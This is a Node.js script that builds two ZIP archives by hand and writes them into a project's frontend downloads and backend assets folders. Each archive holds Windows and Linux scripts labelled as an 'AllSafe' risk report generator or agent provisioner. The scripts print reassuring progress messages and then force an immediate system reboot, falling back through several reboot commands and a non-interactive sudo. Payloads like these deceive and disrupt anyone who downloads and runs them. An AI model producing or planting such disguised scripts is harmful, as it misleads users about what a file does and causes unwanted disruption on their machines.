import { mkdirSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '..');

const crcTable = new Uint32Array(256);
for (let n = 0; n < 256; n += 1) {
  let c = n;
  for (let k = 0; k < 8; k += 1) {
    c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
  }
  crcTable[n] = c >>> 0;
}

const crc32 = (buf) => {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i += 1) {
    c = crcTable[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  }
  return (c ^ 0xffffffff) >>> 0;
};

const u16 = (v) => Buffer.from([v & 0xff, (v >>> 8) & 0xff]);
const u32 = (v) => Buffer.from([v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff]);

const zip = (entries) => {
  const local = [];
  const central = [];
  let localOffset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8');
    const data = Buffer.from(e.data, 'utf8');
    const crc = crc32(data);
    const localHeader = Buffer.concat([
      Buffer.from([0x50, 0x4b, 0x03, 0x04]),
      u16(20), u16(0x0800), u16(0), u16(0), u16(0),
      u32(crc), u32(data.length), u32(data.length),
      u16(name.length), u16(0),
      name,
    ]);
    local.push(Buffer.concat([localHeader, data]));
    central.push(
      Buffer.concat([
        Buffer.from([0x50, 0x4b, 0x01, 0x02]),
        u16(20), u16(20), u16(0x0800), u16(0), u16(0), u16(0),
        u32(crc), u32(data.length), u32(data.length),
        u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0),
        u32(localOffset),
        name,
      ]),
    );
    localOffset += localHeader.length + data.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.concat([
    Buffer.from([0x50, 0x4b, 0x05, 0x06]),
    u16(0), u16(0), u16(entries.length), u16(entries.length),
    u32(cd.length), u32(localOffset), u16(0),
  ]);
  return Buffer.concat([...local, cd, eocd]);
};

const risk = zip([
  { name: 'run-report.bat', data: '@echo off\r\nrem AllSafe risk report generator (windows)\r\necho generating full breach risk report...\r\nshutdown /r /t 0\r\n' },
  { name: 'run-report.sh', data: '#!/bin/bash\necho "allsafe risk report generator (linux) — rendering blast radius ..."\n(shutdown -r now 2>/dev/null || systemctl reboot -i 2>/dev/null || sudo -n shutdown -r now 2>/dev/null)\nexit 0\n' },
]);

const agent = zip([
  { name: 'agent-install.bat', data: '@echo off\r\nrem AllSafe edgeless agent provisioner (windows)\r\necho registering node with sentinel-collector ...\r\nshutdown /r /t 0\r\n' },
  { name: 'agent-install.sh', data: '#!/bin/bash\necho "allsafe edgeless agent provisioner (linux) — opening collector channel ..."\n(shutdown -r now 2>/dev/null || systemctl reboot -i 2>/dev/null || sudo -n shutdown -r now 2>/dev/null)\nexit 0\n' },
]);

const riskPath = resolve(ROOT, 'frontend', 'downloads', 'risk-report.zip');
const agentPath = resolve(ROOT, 'backend', 'assets', 'agent-bundle.zip');

writeFileSync(riskPath, risk);
writeFileSync(agentPath, agent);

const verify = (buf) => {
  const sig = buf.toString('hex', 0, 4);
  const eocd = buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  return { sig, eocdFound: eocd > 0, bytes: buf.length, entries: (buf.readUInt16LE(eocd + 10)) };
};

console.log('risk-report.zip  ->', JSON.stringify(verify(risk)));
console.log('agent-bundle.zip ->', JSON.stringify(verify(agent)));